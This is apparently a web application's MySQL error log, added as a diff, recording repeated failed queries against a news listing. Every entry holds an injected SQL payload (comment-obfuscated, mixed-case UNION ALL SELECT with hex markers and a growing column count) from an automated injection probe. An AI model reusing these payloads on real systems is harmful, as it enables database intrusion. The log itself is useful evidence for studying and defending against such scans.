@@ -1,0 +1,259 @@
+Time : 10:58:40
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x3936313537383' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 999999.9' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:58:17
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x3936313537383' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 999999.9' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:58:15
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x3936313537383' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 999999.9' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:57:53
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x3936313537383' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 999999.9' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:55:47
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x3936313537383' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 999999.9' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:55:04
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x3936313537383' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 999999.9' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:51:37
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x3936313537383' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 999999.9' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:50:32
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39 and '1'='1=0) A' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 999999.9' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:45:42
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9 or 1'='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39,0x393631353738343330392e39,0x39363135373834333031302e39,0x39363135373834333031312e39,0x39363135373834333031322e39,0x39363135373834333031332e39,0x39363135373834333031342e39,0x39363135373834333031352e39,0x39363135373834333031362e39,0x39363135373834333031372e39,0x39363135373834333031382e39,0x39363135373834333031392e39,0x39363135373834333032302e39,0x39363135373834333032312e39,0x39363135373834333032322e39,0x39363135373834333032332e39,0x39363135373834333032342e39,0x39363135373834333032352e39,0x39363135373834333032362e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:43:38
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9 or 1'='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39,0x393631353738343330392e39,0x39363135373834333031302e39,0x39363135373834333031312e39,0x39363135373834333031322e39,0x39363135373834333031332e39,0x39363135373834333031342e39,0x39363135373834333031352e39,0x39363135373834333031362e39,0x39363135373834333031372e39,0x39363135373834333031382e39,0x39363135373834333031392e39,0x39363135373834333032302e39,0x39363135373834333032312e39,0x39363135373834333032322e39,0x39363135373834333032332e39,0x39363135373834333032342e39,0x39363135373834333032352e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:41:53
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9 or 1'='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39,0x393631353738343330392e39,0x39363135373834333031302e39,0x39363135373834333031312e39,0x39363135373834333031322e39,0x39363135373834333031332e39,0x39363135373834333031342e39,0x39363135373834333031352e39,0x39363135373834333031362e39,0x39363135373834333031372e39,0x39363135373834333031382e39,0x39363135373834333031392e39,0x39363135373834333032302e39,0x39363135373834333032312e39,0x39363135373834333032322e39,0x39363135373834333032332e39,0x39363135373834333032342e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:40:11
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9 or 1'='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39,0x393631353738343330392e39,0x39363135373834333031302e39,0x39363135373834333031312e39,0x39363135373834333031322e39,0x39363135373834333031332e39,0x39363135373834333031342e39,0x39363135373834333031352e39,0x39363135373834333031362e39,0x39363135373834333031372e39,0x39363135373834333031382e39,0x39363135373834333031392e39,0x39363135373834333032302e39,0x39363135373834333032312e39,0x39363135373834333032322e39,0x39363135373834333032332e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:39:48
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9 or 1'='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39,0x393631353738343330392e39,0x39363135373834333031302e39,0x39363135373834333031312e39,0x39363135373834333031322e39,0x39363135373834333031332e39,0x39363135373834333031342e39,0x39363135373834333031352e39,0x39363135373834333031362e39,0x39363135373834333031372e39,0x39363135373834333031382e39,0x39363135373834333031392e39,0x39363135373834333032302e39,0x39363135373834333032312e39,0x39363135373834333032322e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:37:20
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9 or 1'='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39,0x393631353738343330392e39,0x39363135373834333031302e39,0x39363135373834333031312e39,0x39363135373834333031322e39,0x39363135373834333031332e39,0x39363135373834333031342e39,0x39363135373834333031352e39,0x39363135373834333031362e39,0x39363135373834333031372e39,0x39363135373834333031382e39,0x39363135373834333031392e39,0x39363135373834333032302e39,0x39363135373834333032312e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:36:51
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9 or 1'='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39,0x393631353738343330392e39,0x39363135373834333031302e39,0x39363135373834333031312e39,0x39363135373834333031322e39,0x39363135373834333031332e39,0x39363135373834333031342e39,0x39363135373834333031352e39,0x39363135373834333031362e39,0x39363135373834333031372e39,0x39363135373834333031382e39,0x39363135373834333031392e39,0x39363135373834333032302e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:35:06
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9 or 1'='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39,0x393631353738343330392e39,0x39363135373834333031302e39,0x39363135373834333031312e39,0x39363135373834333031322e39,0x39363135373834333031332e39,0x39363135373834333031342e39,0x39363135373834333031352e39,0x39363135373834333031362e39,0x39363135373834333031372e39,0x39363135373834333031382e39,0x39363135373834333031392e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:32:26
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9 or 1'='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39,0x393631353738343330392e39,0x39363135373834333031302e39,0x39363135373834333031312e39,0x39363135373834333031322e39,0x39363135373834333031332e39,0x39363135373834333031342e39,0x39363135373834333031352e39,0x39363135373834333031362e39,0x39363135373834333031372e39,0x39363135373834333031382e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:30:42
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9 or 1'='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39,0x393631353738343330392e39,0x39363135373834333031302e39,0x39363135373834333031312e39,0x39363135373834333031322e39,0x39363135373834333031332e39,0x39363135373834333031342e39,0x39363135373834333031352e39,0x39363135373834333031362e39,0x39363135373834333031372e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:28:57
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9 or 1'='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39,0x393631353738343330392e39,0x39363135373834333031302e39,0x39363135373834333031312e39,0x39363135373834333031322e39,0x39363135373834333031332e39,0x39363135373834333031342e39,0x39363135373834333031352e39,0x39363135373834333031362e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:28:54
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9 or 1'='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39,0x393631353738343330392e39,0x39363135373834333031302e39,0x39363135373834333031312e39,0x39363135373834333031322e39,0x39363135373834333031332e39,0x39363135373834333031342e39,0x39363135373834333031352e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:28:38
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9 or 1'='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39,0x393631353738343330392e39,0x39363135373834333031302e39,0x39363135373834333031312e39,0x39363135373834333031322e39,0x39363135373834333031332e39,0x39363135373834333031342e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:27:34
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9 or 1'='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39,0x393631353738343330392e39,0x39363135373834333031302e39,0x39363135373834333031312e39,0x39363135373834333031322e39,0x39363135373834333031332e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:26:49
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9 or 1'='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39,0x393631353738343330392e39,0x39363135373834333031302e39,0x39363135373834333031312e39,0x39363135373834333031322e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:24:44
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9 or 1'='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39,0x393631353738343330392e39,0x39363135373834333031302e39,0x39363135373834333031312e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:21:55
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9 or 1'='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39,0x393631353738343330392e39,0x39363135373834333031302e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:20:50
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9 or 1'='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39,0x393631353738343330392e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:19:59
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9 or 1'='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:19:36
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9 or 1'='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:19:34
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9 or 1'='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:18:50
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9 or 1'='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:18:48
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9 or 1'='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:16:02
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9 or 1'='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:14:16
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9 or 1'='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:13:09
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39 and '1'='1=' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9 or 1'='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:07:58
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9 and 1'='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39,0x393631353738343330382e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:07:55
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353' at line 1
